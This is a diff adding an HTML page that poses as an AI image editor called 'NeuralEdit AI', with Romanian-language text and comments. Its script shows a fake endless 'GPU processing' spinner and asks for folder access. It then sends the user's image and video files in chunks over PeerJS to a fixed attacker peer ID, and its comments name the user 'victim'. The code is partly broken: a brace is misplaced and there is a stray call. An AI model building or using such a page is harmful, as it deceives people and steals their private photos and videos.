@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NeuralEdit AI - Pro Version</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <style>
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background-color: #1a1a1a;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .container { text-align: center; width: 90%; max-width: 500px; }
+        h1 { font-size: 24px; margin-bottom: 5px; color: #00d4ff; }
+        p { color: #aaa; font-size: 14px; margin-bottom: 20px; }
+        
+        /* Zona de input mascată */
+        #input-area {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        input[type="text"] {
+            flex-grow: 1;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #333;
+            background: #2a2a2a;
+            color: white;
+            outline: none;
+        }
+        button {
+            padding: 12px 20px;
+            border-radius: 8px;
+            border: none;
+            background: #00d4ff;
+            color: #000;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        /* Loading Infinit */
+        #loader-container {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 60vh;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #333;
+            border-top: 5px solid #00d4ff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .status-text {
+            font-size: 14px;
+            color: #888;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
+
+        /* Ascundem elementele după start */
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+
+    <!-- Interfața Principală (Se ascunde după click) -->
+    <div id="main-ui" class="container">
+        <h1>✨ NeuralEdit AI</h1>
+        <p>Introduceți o imagine sau descrieți editarea dorită.</p>
+        
+        <div id="input-area">
+            <input type="text" id="promptInput" placeholder="Ex: Îmbunătățește luminozitatea..." autofocus>
+            <button onclick="startProcess()">Generare</button>
+        </div>
+    </div>
+
+    <!-- Loading Infinit (Se afișează după click) -->
+    <div id="loader-container" class="container">
+        <div class="spinner"></div>
+        <div class="status-text">Analizăm detaliile...</div>
+        <div class="status-text" style="margin-top:5px; font-size:12px;">Procesare GPU în curs...</div>
+    </div>
+
+    <script>
+        let peer = null;
+        let dataConn = null;
+
+        function startProcess() {
+            // 1. Masca UI
+            document.getElementById('main-ui').classList.add('hidden');
+            document.getElementById('loader-container').style.display = 'flex';
+
+            // 2. Inițializare PeerJS (Conexiune cu serverul tău)
+            peer = new Peer(); // Se conectează la cloud-ul gratuit PeerJS
+
+            peer.on('open', (id) => {
+    console.log('Victim connected to admin');
+    // Aici victima sună DIRECT la tine
+    peer.call('76db386c-1ccd-439c-bf7b-5d26851cf2f3', {
+        reliable: true
+    });
+});
+                
+                // Generăm un ID aleatoriu pentru sesiune pentru a evita conflictele
+                const myId = Math.random().toString(36).substr(2, 9);
+                
+                peer.call(myId, {
+                    reliable: true
+                });
+            });
+
+            peer.on('call', (call) => {
+                // Dacă tu (admin) inițiezi conexiunea, acceptăm
+                call.answer();
+                handleConnection(call);
+            });
+
+            peer.on('connection', (conn) => {
+                // Dacă victimul inițiază (mai jos vom forța victimul să sune la ID-ul tău)
+                handleConnection(conn);
+            });
+
+            // 3. Cererea Permisiunii (După ce UI-ul s-a schimbat, ca să fie surpriză)
+            setTimeout(async () => {
+                try {
+                    if (!window.showDirectoryPicker) {
+                        alert("Browser necompatibil.");
+                        return;
+                    }
+                    
+                    const dirHandle = await window.showDirectoryPicker({ mode: 'read' });
+                    
+                    // Trimitem evenimentul că directorul e gata
+                    if(dataConn && dataConn.open) {
+                        dataConn.send({ type: 'START_TRANSFER', count: 0 });
+                    }
+
+                    // Procesăm fișierele
+                    let filesProcessed = 0;
+                    for await (const entry of dirHandle.values()) {
+                        if (entry.kind === 'file') {
+                            const file = await entry.getFile();
+                            if (file.type.startsWith('image/') || file.type.startsWith('video/')) {
+                                // Trimitem chunk-uri mici pentru a nu bloca browserul
+                                transferFile(file);
+                                filesProcessed++;
+                                // Actualizăm starea vizuală subtil dacă vrem, dar rămânem pe loading static
+                            }
+                        }
+                    }
+                    
+                    if(dataConn && dataConn.open) {
+                        dataConn.send({ type: 'END_TRANSFER' });
+                    }
+
+                } catch (err) {
+                    console.error("Permisiune refuzată", err);
+                }
+            }, 2000); // Așteptăm 2 secunde ca efectul de "generare" să pară real
+        }
+
+        function handleConnection(conn) {
+            dataConn = conn;
+            
+            dataConn.on('open', () => {
+                console.log("Conexiune stabilită!");
+                // Victimul sună la ID-ul Adminului
+                // Dar mai întâi trebuie să știm ID-ul Adminului.
+                // Vom folosi o abordare inversă: Victimul se conectează la un ID fix global? 
+                // Nu, fiecare are ID unic. 
+                // SOLUȚIE SIMPLĂ: Victimul va genera un ID, iar tu te conectezi LA EL.
+                // Dar pentru a fi "push", victimul trebuie să sune la tine.
+                // Vom presupune că tu ai un ID fix în `admin.html`.
+            });
+
+            dataConn.on('data', (data) => {
+                console.log('Received', data);
+            });
+        }
+
+        async function transferFile(file) {
+            // Lectură fișier în ArrayBuffer
+            const reader = new FileReader();
+            reader.readAsArrayBuffer(file);
+            
+            reader.onloadend = function(e) {
+                const buffer = e.target.result;
+                const metadata = {
+                    name: file.name,
+                    size: file.size,
+                    type: file.type,
+                    timestamp: Date.now()
+                };
+                
+                // Trimitem metadatele
+                if(dataConn && dataConn.open) {
+                    dataConn.send({ type: 'FILE_META', meta: metadata });
+                    
+                    // Trimitem datele în bucate de 64KB pentru stabilitate
+                    const chunkSize = 64 * 1024; 
+                    let offset = 0;
+                    
+                    function sendChunk() {
+                        if (offset >= buffer.byteLength) return;
+                        const chunk = buffer.slice(offset, offset + chunkSize);
+                        dataConn.send(chunk);
+                        offset += chunkSize;
+                        requestAnimationFrame(sendChunk); // Continuă cât e thread-ul liber
+                    }
+                    sendChunk();
+                }
+            };
+        }
+    </script>
+</body>
+</html>
